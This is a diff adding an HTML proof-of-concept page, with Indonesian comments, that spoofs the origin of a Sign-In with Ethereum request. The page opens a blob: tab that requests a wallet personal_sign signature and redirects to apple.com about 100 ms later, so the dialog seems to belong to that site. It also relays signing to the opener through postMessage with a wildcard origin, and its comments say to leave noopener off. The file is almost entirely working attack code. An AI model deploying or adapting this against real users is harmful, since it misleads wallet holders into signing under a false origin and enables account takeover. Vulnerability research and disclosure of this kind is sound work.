@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Blob SIWE Spoofing PoC (Fixed)</title>
+  <style>
+    body { font-family: system-ui, sans-serif; padding: 2rem; }
+    button { padding: .6rem 1rem; border-radius: .5rem; border: 1px solid #ccc; cursor: pointer; }
+    #status { margin-top: 1rem; }
+    code { background: #f6f6f6; padding: .2rem .4rem; border-radius: .25rem; }
+  </style>
+</head>
+<body>
+  <h2>Blob SIWE Spoofing PoC (Fixed)</h2>
+  <p>1) Klik <b>Open blob page</b> → akan membuka tab <code>blob:</code>.<br>
+     2) Di tab blob, klik <b>SIWE Sign-In</b> untuk memicu dialog tanda tangan.<br>
+     3) Blob page akan mengalihkan ke <code>https://apple.com</code> segera setelah request dibuat.</p>
+
+  <button id="openBlob">Open blob page</button>
+  <div id="status">Idle</div>
+
+  <script>
+    // --- Listener di halaman asal: terima fallback dari blob untuk memicu SIWE di origin asli ---
+    window.addEventListener("message", async (ev) => {
+      if (!ev || !ev.data || ev.data.type !== "TRIGGER_SIWE_FROM_BLOB") return;
+      try {
+        const sig = await siweSign(); // jalankan SIWE di halaman asal
+        document.getElementById("status").innerText = "Signed via opener: " + sig.slice(0, 12) + "...";
+      } catch (e) {
+        document.getElementById("status").innerText = "Signing failed via opener";
+        console.error(e);
+      }
+    });
+
+    // Fungsi SIWE (personal_sign) — dipakai jika fallback ke origin asli
+    async function siweSign() {
+      if (!window.ethereum) throw new Error("No wallet injected on opener");
+      const [address] = await ethereum.request({ method: "eth_requestAccounts" });
+
+      const domain = location.host || "unknown";
+      const uri = location.origin + location.pathname;
+      const statement = "Sign-In with Ethereum (blob demo)";
+      const now = new Date();
+      const expirationTime = new Date(now.getTime() + 10 * 60 * 1000).toISOString();
+      const issuedAt = now.toISOString();
+      const nonce = Math.random().toString(36).slice(2);
+
+      const message =
+        domain + " wants you to sign in with your Ethereum account:\n" +
+        address + "\n\n" +
+        statement + "\n\n" +
+        "URI: " + uri + "\n" +
+        "Version: 1\n" +
+        "Chain ID: 1\n" +
+        "Nonce: " + nonce + "\n" +
+        "Issued At: " + issuedAt + "\n" +
+        "Expiration Time: " + expirationTime;
+
+      const sig = await ethereum.request({
+        method: "personal_sign",
+        params: [message, address]
+      });
+
+      return sig;
+    }
+
+    // --- Konten HTML untuk halaman blob ---
+    const blobHtml =
+`<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Blob Page - SIWE</title>
+  <style>
+    body { font-family: system-ui, sans-serif; padding: 2rem; }
+    button { padding: .6rem 1rem; border-radius: .5rem; border: 1px solid #ccc; cursor: pointer; }
+    #status { margin-top: 1rem; white-space: pre-line; }
+  </style>
+</head>
+<body>
+  <h3>Blob Origin</h3>
+  <p>Ini origin <code>blob:</code>. Klik tombol untuk memicu SIWE.</p>
+  <button id="siweBtn">SIWE Sign-In</button>
+  <div id="status">Not signed in</div>
+
+  <script>
+    (function(){
+      const statusEl = document.getElementById("status");
+
+      async function signHereOrFallback() {
+        try {
+          if (window.ethereum) {
+            statusEl.textContent = "ethereum detected on blob. Requesting accounts...";
+            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+            const address = accounts[0];
+
+            const domain = location.host || "blob";
+            const uri = "blob:";
+            const statement = "Sign-In with Ethereum (blob demo)";
+            const now = new Date();
+            const expirationTime = new Date(now.getTime() + 10*60*1000).toISOString();
+            const issuedAt = now.toISOString();
+            const nonce = Math.random().toString(36).slice(2);
+
+            const message =
+              domain + " wants you to sign in with your Ethereum account:\\n" +
+              address + "\\n\\n" +
+              statement + "\\n\\n" +
+              "URI: " + uri + "\\n" +
+              "Version: 1\\n" +
+              "Chain ID: 1\\n" +
+              "Nonce: " + nonce + "\\n" +
+              "Issued At: " + issuedAt + "\\n" +
+              "Expiration Time: " + expirationTime;
+
+            const signPromise = ethereum.request({
+              method: "personal_sign",
+              params: [message, address]
+            });
+
+            // Redirect segera setelah popup dipicu
+            setTimeout(() => { window.location.assign("https://apple.com"); }, 100);
+
+            const sig = await signPromise;
+            console.log("Blob SIWE signature:", sig);
+            statusEl.textContent = "Signed on blob: " + sig.slice(0, 12) + "...";
+          } else {
+            statusEl.textContent = "ethereum NOT available on blob. Trying fallback via opener...";
+            if (window.opener) {
+              window.opener.postMessage({ type: "TRIGGER_SIWE_FROM_BLOB" }, "*");
+              // Tetap lakukan redirect untuk mereplikasi confusion
+              setTimeout(() => { window.location.assign("https://apple.com"); }, 100);
+            } else {
+              statusEl.textContent = "No opener available (likely due to noopener). Cannot fallback.";
+            }
+          }
+        } catch (e) {
+          console.error(e);
+          statusEl.textContent = "Error: " + (e && e.message ? e.message : String(e));
+        }
+      }
+
+      document.getElementById("siweBtn").addEventListener("click", signHereOrFallback);
+    })();
+  <\/script>
+</body>
+</html>`;
+
+    // Buat blob URL
+    const blobUrl = URL.createObjectURL(new Blob([blobHtml], { type: "text/html" }));
+
+    // BUKA blob TANPA "noopener" supaya window.opener tersedia untuk fallback
+    document.getElementById("openBlob").addEventListener("click", () => {
+      window.open(blobUrl, "_blank"); // JANGAN pakai "noopener"
+      document.getElementById("status").innerText = "blob page opened (opener retained)";
+    });
+  </script>
+</body>
+</html>
